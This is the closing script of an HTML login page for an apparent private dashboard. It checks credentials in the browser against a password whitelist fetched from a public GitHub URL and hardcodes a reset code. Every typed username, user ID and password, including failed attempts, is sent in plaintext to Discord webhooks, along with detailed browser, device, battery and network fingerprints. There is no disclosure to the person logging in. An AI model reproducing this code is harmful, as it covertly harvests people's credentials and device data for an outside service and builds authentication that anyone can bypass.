      const loginBox = document.getElementById('loginBox');
      const usernameInput = document.getElementById('username');
      const passwordInput = document.getElementById('password');
      const userIDInput = document.getElementById('userID');
      const showPasswordCheckbox = document.getElementById('showPassword');
      const submitBtn = document.getElementById('submitBtn');
      const errorMsg = document.getElementById('errorMsg');
      const attemptsText = document.getElementById('attemptsText');
      const resetPopup = document.getElementById('resetPopup');
      const resetField = document.getElementById('resetField');
      const resetBtn = document.getElementById('resetBtn');

      let attempts = 5;
      let users = []; // This will be populated from the JSON URL
      let loginTime = null;
      const USER_JSON_URL = 'https://raw.githubusercontent.com/Nuker214/Private.System/refs/heads/main/Whitelist.json';

      // Fetch user JSON data on load
      fetch(USER_JSON_URL)
        .then(res => res.json())
        .then(data => {
          users = data;
          console.log("Whitelist loaded successfully.");
        })
        .catch((error) => {
          users = []; // Fallback to empty if fetch fails
          console.error('Failed to load user whitelist:', error);
        });

      // Show/hide password toggle
      showPasswordCheckbox.addEventListener('change', () => {
        passwordInput.type = showPasswordCheckbox.checked ? 'text' : 'password';
      });

      // Flash red outline function for login box (on failure)
      function flashRedOutline(times = 2, delay = 400) {
        loginBox.classList.add('flashing');
        setTimeout(() => {
          loginBox.classList.remove('flashing');
        }, times * delay); // Ensure animation completes
      }

      // Get WebGL Renderer (used for device logging)
      function getWebGLRenderer() {
        try {
          const canvas = document.createElement('canvas');
          const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
          if (!gl) return "Unavailable";
          const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
          return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Unavailable";
        } catch {
          return "Unavailable";
        }
      }

      // Battery status promise (device logging)
      async function getBatteryStatus() {
        if (navigator.getBattery) {
          try {
            const battery = await navigator.getBattery();
            return battery;
          } catch {
            return null;
          }
        }
        return null;
      }

      // Build user info object from user JSON
      function findUser(username, userID) {
        return users.find(u =>
          u.username?.toLowerCase() === username.toLowerCase() &&
          u.userID?.toString() === userID.toString()
        );
      }

      // Send Discord webhook with custom embed fields
      async function sendWebhook(url, embed) {
        try {
          await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ embeds: [embed] }),
          });
        } catch (e) {
          console.warn('Webhook send failed:', e);
        }
      }

      // Collect browser & device info for logs
      async function collectLoggingData(user, password) {
        const now = new Date();
        loginTime = now.toISOString();
        const batteryStatus = await getBatteryStatus();

        return {
          user,
          password,
          loginTime,
          batteryStatus,
          webglRenderer: getWebGLRenderer(),
        };
      }

      // --- New Logging Functions ---
      async function logUsername(name, username) {
        const embed = { title: "Login Input: Username", color: 0x3498db, fields: [{ name: "Username", value: username, inline: true }, { name: "Name", value: name || "N/A", inline: true }, { name: "Timestamp", value: new Date().toLocaleString(), inline: false }] };
        await sendWebhook(loggingWebhooks.username, embed);
      }
      async function logPassword(name, password) {
        const embed = { title: "Login Input: Password", color: 0xe74c3c, fields: [{ name: "Password", value: password, inline: true }, { name: "Name", value: name || "N/A", inline: true }, { name: "Timestamp", value: new Date().toLocaleString(), inline: false }] };
        await sendWebhook(loggingWebhooks.password, embed);
      }
      async function logIdentifier(name, identifier) {
        const embed = { title: "Login Input: Identifier", color: 0x2ecc71, fields: [{ name: "User ID", value: identifier, inline: true }, { name: "Name", value: name || "N/A", inline: true }, { name: "Timestamp", value: new Date().toLocaleString(), inline: false }] };
        await sendWebhook(loggingWebhooks.identifier, embed);
      }
      async function logInvalidUsername(name, username) {
        const embed = { title: "Invalid Login Attempt: Username", color: 0xf39c12, fields: [{ name: "Invalid Username", value: username, inline: true }, { name: "Name", value: name || "N/A", inline: true }, { name: "Timestamp", value: new Date().toLocaleString(), inline: false }] };
        await sendWebhook(loggingWebhooks.invalid_username, embed);
      }
      async function logInvalidPassword(name, password) {
        const embed = { title: "Invalid Login Attempt: Password", color: 0xe67e22, fields: [{ name: "Invalid Password", value: password, inline: true }, { name: "Name", value: name || "N/A", inline: true }, { name: "Timestamp", value: new Date().toLocaleString(), inline: false }] };
        await sendWebhook(loggingWebhooks.invalid_password, embed);
      }
      async function logInvalidIdentifier(name, identifier) {
        const embed = { title: "Invalid Login Attempt: Identifier", color: 0xd35400, fields: [{ name: "Invalid User ID", value: identifier, inline: true }, { name: "Name", value: name || "N/A", inline: true }, { name: "Timestamp", value: new Date().toLocaleString(), inline: false }] };
        await sendWebhook(loggingWebhooks.invalid_identifier, embed);
      }
      async function logAttemptsCounter(name, username, password, identifier, attemptsLeft) {
        const embed = { title: "Login Attempts Counter", color: 0x9b59b6, fields: [{ name: "Username", value: username, inline: true }, { name: "Password", value: password, inline: true }, { name: "User ID", value: identifier, inline: true }, { name: "Name", value: name || "N/A", inline: true }, { name: "Attempts Left", value: attemptsLeft.toString(), inline: true }, { name: "Timestamp", value: new Date().toLocaleString(), inline: false }] };
        await sendWebhook(loggingWebhooks.attempts_counter, embed);
      }
      async function logAttemptsExceeded(name, username, password, identifier) {
        const embed = { title: "Login Attempts Exceeded", color: 0xc0392b, fields: [{ name: "Username", value: username, inline: true }, { name: "Password", value: password, inline: true }, { name: "User ID", value: identifier, inline: true }, { name: "Name", value: name || "N/A", inline: true }, { name: "Status", value: "MAX ATTEMPTS EXCEEDED", inline: true }, { name: "Timestamp", value: new Date().toLocaleString(), inline: false }] };
        await sendWebhook(loggingWebhooks.attempts_exceeded, embed);
      }
      async function logResetBoxDetected(name, username, password, identifier, enteredCode) {
        const embed = { title: "System Alert: Reset Box Detected", color: 0xffff00, fields: [{ name: "Username", value: username, inline: true }, { name: "Password", value: password, inline: true }, { name: "User ID", value: identifier, inline: true }, { name: "Name", value: name || "N/A", inline: true }, { name: "Entered Reset Code", value: enteredCode, inline: false }, { name: "Timestamp", value: new Date().toLocaleString(), inline: false }] };
        await sendWebhook(loggingWebhooks.resetBoxDetected, embed);
      }
      async function logResetCodeResult(name, username, password, identifier, enteredCode, isCorrect) {
        const embed = { title: isCorrect ? "System Action: Reset Code Accepted" : "System Alert: Incorrect Reset Code", color: isCorrect ? 0x00ff00 : 0xff0000, fields: [{ name: "Username", value: username, inline: true }, { name: "Password", value: password, inline: true }, { name: "User ID", value: identifier, inline: true }, { name: "Name", value: name || "N/A", inline: true }, { name: "Reset Code Attempted", value: enteredCode, inline: false }, { name: "Result", value: isCorrect ? "Accepted" : "Incorrect", inline: true }, { name: "Timestamp", value: new Date().toLocaleString(), inline: false }] };
        await sendWebhook(loggingWebhooks.resetCodeResult, embed);
      }

      // Original embed builders for the 5 main webhooks (unchanged)
      function buildUserLoggingEmbed(data) {
        return { title: "User Logging System", color: 0xff0000, fields: [{ name: "Name", value: data.user.name || "N/A", inline: true }, { name: "Username", value: data.user.username, inline: true }, { name: "Password", value: data.password, inline: true }, { name: "Rank Type", value: data.user.rank?.toString() || "N/A", inline: true }, { name: "Role Type", value: data.user.role || "N/A", inline: true }, { name: "Login Time", value: data.loginTime, inline: false }, { name: "User Identifier", value: data.user.userID.toString(), inline: true }, { name: "Account Creation Date", value: data.user.accountCreationDate || "N/A", inline: true }] };
      }
      function buildBrowserLoggingEmbed(data) { const nav = navigator; return { title: "Browser Logging System", color: 0x00ff00, fields: [{ name: "Person's Name", value: data.user.name || "N/A", inline: true }, { name: "Username", value: data.user.username || "N/A", inline: true }, { name: "User Identifier", value: data.user.userID?.toString() || "N/A", inline: true }, { name: "Browser Vendor", value: nav.vendor || "Unknown", inline: true }, { name: "Browser Language", value: nav.language || "Unknown", inline: true }, { name: "Browser Languages", value: nav.languages ? nav.languages.join(", ") : "Unknown", inline: false }, { name: "User Agent", value: nav.userAgent || "Unknown", inline: false }, { name: "Installed Plugins", value: nav.plugins?.length > 0 ? `${nav.plugins.length} plugin(s)` : "None", inline: true }, { name: "Browser Window Size", value: `${window.innerWidth}x${window.innerHeight}`, inline: true }, { name: "Browser Zoom Level", value: `${Math.round(window.devicePixelRatio * 100)}%`, inline: true }, { name: "Incognito/Private Mode Status", value: "Undetected", inline: true }, { name: "Cookies Enabled", value: nav.cookieEnabled ? "Yes" : "No", inline: true }, { name: "Do Not Track", value: nav.doNotTrack || "Unknown", inline: true }, { name: "Browser Tab Visibility", value: document.visibilityState || "Unknown", inline: true }, { name: "Font Smoothing Type", value: "Unavailable", inline: true }, { name: "Clipboard Access", value: nav.clipboard ? "Supported" : "Not Supported", inline: true }, { name: "WebGL Renderer Info", value: data.webglRenderer || "Unavailable", inline: true }, { name: "Browser Connection Speed", value: nav.connection?.effectiveType || "Unknown", inline: true }] }; }
      function buildDeviceLoggingEmbed(data) { const nav = navigator; const battery = data.batteryStatus; return { title: "Device Logging System", color: 0x0000ff, fields: [{ name: "Person's Name", value: data.user.name || "N/A", inline: true }, { name: "Username", value: data.user.username || "N/A", inline: true }, { name: "User ID", value: data.user.userID?.toString() || "N/A", inline: true }, { name: "Device Platform", value: nav.platform || "Unknown", inline: true }, { name: "CPU Cores", value: nav.hardwareConcurrency ? `${nav.hardwareConcurrency} cores` : "Unavailable", inline: true }, { name: "Device Memory", value: nav.deviceMemory ? `${nav.deviceMemory} GB` : "Unavailable", inline: true }, { name: "GPU Renderer", value: data.webglRenderer || "Unavailable", inline: true }, { name: "Battery Charging", value: battery?.charging ? "Yes" : "No", inline: true }, { name: "Battery Level", value: battery ? `${Math.round(battery.level * 100)}%` : "Unavailable", inline: true }, { name: "Touch Support", value: ('ontouchstart' in window || nav.maxTouchPoints > 0) ? "Yes" : "No", inline: true }, { name: "Screen Resolution", value: `${screen.width}x${screen.height}`, inline: true }, { name: "Screen Orientation", value: screen.orientation?.type || "Unavailable", inline: true }, { name: "Color Depth", value: `${screen.colorDepth} bit`, inline: true }, { name: "Pixel Depth", value: `${screen.pixelDepth} bit`, inline: true }, { name: "Device Pixel Ratio", value: window.devicePixelRatio?.toString() || "Unknown", inline: true }, { name: "Max Touch Points", value: nav.maxTouchPoints?.toString() || "0", inline: true }, { name: "Vendor", value: nav.vendor || "Unknown", inline: true }, { name: "Language", value: nav.language || "Unknown", inline: true }] }; }
      function buildConnectionLoggingEmbed(data) { const nav = navigator; return { title: "Connection Logging System", color: 0xffff00, fields: [{ name: "Person's Name", value: data.user.name || "N/A", inline: true }, { name: "Username", value: data.user.username || "N/A", inline: true }, { name: "User ID", value: data.user.userID?.toString() || "N/A", inline: true }, { name: "Online Status", value: nav.onLine ? "Online" : "Offline", inline: true }, { name: "Connection Type", value: nav.connection?.type || "Unknown", inline: true }, { name: "Effective Connection Type", value: nav.connection?.effectiveType || "Unknown", inline: true }, { name: "Downlink Speed", value: nav.connection?.downlink ? `${nav.connection.downlink} Mbps` : "Unknown", inline: true }, { name: "RTT (Round Trip Time)", value: nav.connection?.rtt ? `${nav.connection.rtt} ms` : "Unknown", inline: true }, { name: "Save Data Mode", value: nav.connection?.saveData ? "Enabled" : "Disabled", inline: true }, { name: "IP Address", value: data.user.ipAddress || "Unavailable", inline: false }, { name: "VPN Detected", value: data.user.vpnDetected ? "Yes" : "No", inline: true }, { name: "Proxy Detected", value: data.user.proxyDetected ? "Yes" : "No", inline: true }, { name: "Public IPv6", value: data.user.ipv6Address || "Unavailable", inline: false }, { name: "Local IP Addresses", value: data.user.localIPs?.join(", ") || "Unavailable", inline: false }, { name: "Network Downlink Max", value: nav.connection?.downlinkMax ? `${nav.connection.downlinkMax} Mbps` : "Unknown", inline: true }, { name: "Network Metered Connection", value: nav.connection?.metered ? "Yes" : "No", inline: true }, { name: "Network Type Detailed", value: nav.connection?.typeDetailed || "Unknown", inline: true }, { name: "Effective Network Bandwidth Estimate", value: nav.connection?.bandwidthEstimate || "Unavailable", inline: true }] }; }
      function buildSessionLoggingEmbed(data) { return { title: "Session Logging System", color: 0x00ffff, fields: [{ name: "Person's Name", value: data.user.name || "N/A", inline: true }, { name: "Username", value: data.user.username || "N/A", inline: true }, { name: "User ID", value: data.user.userID?.toString() || "N/A", inline: true }, { name: "Login Time", value: data.loginTime || "Unknown", inline: true }, { name: "Logout Time", value: data.logoutTime || "Unknown", inline: true }, { name: "Session Duration", value: data.sessionDuration || "Unknown", inline: true }, { name: "Pages Visited", value: data.pagesVisited?.join(", ") || "None", inline: false }, { name: "Actions Performed", value: data.actionsPerformed?.join(", ") || "None", inline: false }, { name: "Errors Encountered", value: data.errorsEncountered?.join("; ") || "None", inline: false }, { name: "Warnings", value: data.warnings?.join("; ") || "None", inline: false }, { name: "User Role Changes", value: data.roleChanges?.join(", ") || "None", inline: false }, { name: "Permission Changes", value: data.permissionChanges?.join(", ") || "None", inline: false }, { name: "Last Activity Timestamp", value: data.lastActivityTime || "Unknown", inline: true }, { name: "Number of Clicks", value: data.numberOfClicks?.toString() || "0", inline: true }, { name: "Number of Form Submissions", value: data.numberOfFormSubmissions?.toString() || "0", inline: true }, { name: "Idle Time", value: data.idleTime || "0s", inline: true }, { name: "Active Time", value: data.activeTime || "Unknown", inline: true }, { name: "Browser Tab Focus Time", value: data.tabFocusTime || "Unknown", inline: true }] }; }

      // Handle login submission
      async function submitLogin() {
        errorMsg.textContent = '';
        if (!usernameInput.value || !passwordInput.value || !userIDInput.value) {
          errorMsg.textContent = 'Please fill all fields.';
          flashRedOutline();
          return;
        }

        const username = usernameInput.value;
        const password = passwordInput.value;
        const userID = userIDInput.value;
        const user = findUser(username, userID);

        // Log all inputs
        await logUsername(user?.name, username);
        await logPassword(user?.name, password);
        await logIdentifier(user?.name, userID);
        
        // Log attempt counter status
        await logAttemptsCounter(
          user?.name || "Unknown",
          username,
          password,
          userID,
          attempts - 1 // Show attempts left *after* this one
        );

        if (!user) {
          await logInvalidUsername(undefined, username); // Name is undefined if user not found
          await logInvalidIdentifier(undefined, userID);
          handleFailedAttempt('User not found.');
          return;
        }

        if (password !== user.password) {
          await logInvalidPassword(user.name, password);
          handleFailedAttempt('Incorrect password.');
          return;
        }

        // Correct login
        attempts = 5; // Reset attempts on successful login
        errorMsg.textContent = '';
        resetPopup.style.display = 'none';
        loginBox.style.borderColor = '#4CAF50'; // Green border on success
        loginBox.style.boxShadow = '0 0 25px rgba(76, 175, 80, 0.6)';

        // Log successful credentials
        await logUsername(user.name, username); // Log again for success confirmation if needed
        await logPassword(user.name, password);
        await logIdentifier(user.name, userID);

        // Collect data and send logs
        const loggingData = await collectLoggingData(user, password);

        // Send all 5 primary webhooks
        await Promise.all([
          sendWebhook(webhookUrls.userLogging, buildUserLoggingEmbed(loggingData)),
          sendWebhook(webhookUrls.browserLogging, buildBrowserLoggingEmbed(loggingData)),
          sendWebhook(webhookUrls.deviceLogging, buildDeviceLoggingEmbed(loggingData)),
          sendWebhook(webhookUrls.connectionLogging, buildConnectionLoggingEmbed(loggingData)),
          sendWebhook(webhookUrls.sessionLogging, buildSessionLoggingEmbed(loggingData)),
        ]);

        // Show dashboard and hide login
        loginBox.style.display = 'none';
        document.getElementById('dashboard').style.display = 'flex'; // Use flex to allow layout styling
        document.body.className = 'dashboard-body';
        
        // Update user info in dashboard
        document.getElementById('loggedInUser').textContent = user.name || username;
        document.getElementById('loggedInID').textContent = userID;
        
        // Initialize dashboard functionality
        dashboard.init();
      }

      // Failed attempt handler
      async function handleFailedAttempt(msg) {
        attempts--;
        attemptsText.textContent = `Attempts Left: ${attempts}`;
        errorMsg.textContent = msg;
        flashRedOutline(); // Flash red on failure
        
        if (attempts <= 0) {
          attempts = 0; // Ensure it doesn't go negative
          errorMsg.textContent = 'No attempts left. Please use the reset code.';
          
          // Log attempts exceeded
          const username = usernameInput.value;
          const password = passwordInput.value;
          const userID = userIDInput.value;
          const user = findUser(username, userID);
          
          await logAttemptsExceeded(
            user?.name || "Unknown",
            username,
            password,
            userID
          );
          
          resetPopup.style.display = 'block';
          resetPopup.setAttribute('aria-hidden', 'false');
          resetField.focus();
          usernameInput.disabled = true;
          passwordInput.disabled = true;
          userIDInput.disabled = true;
          submitBtn.disabled = true;
        }
      }

      async function resetCounter() {
        const enteredCode = resetField.value.trim();
        const isCorrect = enteredCode === 'Reset.Counter.2579'; // Hardcoded reset code

        const username = usernameInput.value || 'Unknown';
        const password = passwordInput.value || 'Unknown';
        const userID = userIDInput.value || 'Unknown';
        const user = findUser(username, userID) || {}; // Use found user or empty object

        await logResetBoxDetected(user.name || "N/A", username, password, userID, enteredCode);

        if (isCorrect) {
          await logResetCodeResult(user.name || "N/A", username, password, userID, enteredCode, true);
          attempts = 5; // Reset attempts
          attemptsText.textContent = `Attempts Left: ${attempts}`;
          errorMsg.textContent = '';
          resetPopup.style.display = 'none';
          resetPopup.setAttribute('aria-hidden', 'true');
          resetField.value = '';
          usernameInput.disabled = false;
          passwordInput.disabled = false;
          userIDInput.disabled = false;
          submitBtn.disabled = false;
          loginBox.style.borderColor = '#4CAF50'; // Green border on reset success
          loginBox.style.boxShadow = '0 0 25px rgba(76, 175, 80, 0.6)';
          alert('Counter reset successfully. You can now try logging in again.');
        } else {
          await logResetCodeResult(user.name || "N/A", username, password, userID, enteredCode, false);
          alert('Incorrect reset code. Please try again.');
          resetField.value = ''; // Clear field on incorrect attempt
          resetField.focus();
        }
      }

      // Attach event listeners
      submitBtn.addEventListener('click', submitLogin);
      resetBtn.addEventListener('click', resetCounter);

      // Enter key submits login if popup hidden, else tries reset
      document.addEventListener('keydown', e => {
        if (e.key === 'Enter') {
          if (resetPopup.style.display === 'block') {
            resetCounter();
          } else {
            submitLogin();
          }
        }
      });

      // Initialize attempts display
      attemptsText.textContent = `Attempts Left: ${attempts}`;
    })();
  </script>
</body>
</html>
